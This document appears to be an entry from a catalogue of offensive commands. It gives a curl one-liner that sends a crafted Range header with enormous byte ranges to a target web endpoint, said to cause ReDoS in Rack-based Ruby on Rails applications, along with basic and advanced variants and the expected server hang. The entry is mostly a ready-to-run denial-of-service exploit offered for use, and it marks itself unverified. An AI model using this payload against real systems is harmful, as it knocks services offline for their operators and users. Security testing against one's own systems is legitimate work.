---
id: cmd-curl-redos-range
name: curl-send-malicious-range-header
type: command
executor: bash
data: >-
  curl -H "Range: bytes=0-18446744073709551615, 0-1, 0-18446744073709551615"
  http://target-app.com/files/largefile
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.434Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - dos
  - web
  - exploit
verified: false
validated: true
submitted: true
---

# curl-send-malicious-range-header

## Command

```bash
curl -H "Range: bytes=0-18446744073709551615, 0-1, 0-18446744073709551615" http://target-app.com/files/largefile
```

## Description

This command uses curl to send an HTTP GET request with a malicious Range header to a target endpoint, exploiting ReDoS in Rack by triggering catastrophic backtracking in the header parser. Use it to test or demonstrate denial of service on vulnerable Ruby on Rails applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Specifies the custom Range header with crafted payload | Yes |
| `http://target-app.com/files/largefile` | URL of the Range-handling endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "Range: bytes=0-18446744073709551615, 0-1, 0-18446744073709551615" http://target.com/files/test
```

### Advanced Usage

```bash
curl -v -H "Range: bytes=0-18446744073709551615, 0-1, 0-18446744073709551615" --max-time 30 http://target.com/files/test
```

(Adds verbose output and timeout for monitoring.)

## Expected Output

The request will hang or timeout due to server-side processing delay, with no immediate response body. Server-side, expect high CPU usage from regex backtracking.

## Related

- [[Related Procedure|procedures/Exploit-ReDoS-in-Rack-Range-Header-Parsing]]
